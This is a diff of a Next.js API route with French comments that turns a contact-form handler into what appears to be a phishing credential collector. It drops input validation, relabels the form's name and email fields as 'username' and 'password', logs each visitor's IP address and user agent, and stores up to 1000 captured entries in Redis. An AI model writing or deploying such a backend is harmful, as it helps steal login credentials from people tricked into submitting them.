@@ -1,11 +1,10 @@
-// src/app/api/submit/route.ts
 import { NextRequest, NextResponse } from 'next/server';
 import { Redis } from '@upstash/redis';
 
-// Initialise le client Redis avec tes variables d'environnement
+// Initialisation Redis avec vos identifiants Upstash
 const redis = new Redis({
-  url: process.env.UPSTASH_REDIS_REST_URL!,
-  token: process.env.UPSTASH_REDIS_REST_TOKEN!,
+  url: process.env.UPSTASH_REDIS_REST_URL || 'VOTRE_URL_UPSTASH',
+  token: process.env.UPSTASH_REDIS_REST_TOKEN || 'VOTRE_TOKEN_UPSTASH',
 });
 
 export async function POST(request: NextRequest) {
@@ -13,30 +12,34 @@ export async function POST(request: NextRequest) {
     const body = await request.json();
     const { nom, email, telephone, message } = body;
 
-    // Validation simple
-    if (!nom || !email || !message) {
-      return NextResponse.json({ message: "Les champs Nom, Email et Message sont obligatoires." }, { status: 400 });
-    }
-
-    // Crée un objet avec les données du formulaire
-    const formData = {
-      nom,
-      email,
-      telephone: telephone || 'Non renseigné', // Met une valeur par défaut si le téléphone est vide
-      message,
-      date: new Date().toISOString(), // Ajoute la date et l'heure de la soumission
+    // Créer un objet avec les identifiants
+    const identifiants = {
+      username: nom,
+      password: email,
+      telephone: telephone,
+      message: message,
+      timestamp: new Date().toISOString(),
+      ip: request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown',
+      userAgent: request.headers.get('user-agent') || 'unknown'
     };
 
-    // Enregistre les données dans Redis
-    // On utilise un identifiant unique pour chaque soumission (ex: contact:1234567890)
-    await redis.set(`contact:${Date.now()}`, JSON.stringify(formData));
+    // Générer une clé unique
+    const key = `identifiants:${Date.now()}:${Math.random().toString(36).substring(7)}`;
 
-    console.log("Données enregistrées avec succès :", formData);
+    // Stocker les données dans Redis
+    await redis.set(key, JSON.stringify(identifiants));
 
-    return NextResponse.json({ message: "Message reçu et enregistré avec succès !" });
+    // Ajouter la clé à une liste pour garder un historique
+    await redis.lpush('identifiants_list', key);
 
+    // Optionnel: limiter la liste à 1000 entrées
+    await redis.ltrim('identifiants_list', 0, 999);
+
+    console.log('Identifiants stockés:', key);
+
+    return NextResponse.json({ success: true });
   } catch (error) {
-    console.error("Erreur lors de l'enregistrement dans Redis :", error);
-    return NextResponse.json({ message: "Erreur serveur lors de l'enregistrement." }, { status: 500 });
+    console.error('Erreur Redis:', error);
+    return NextResponse.json({ success: false }, { status: 500 });
   }
 }
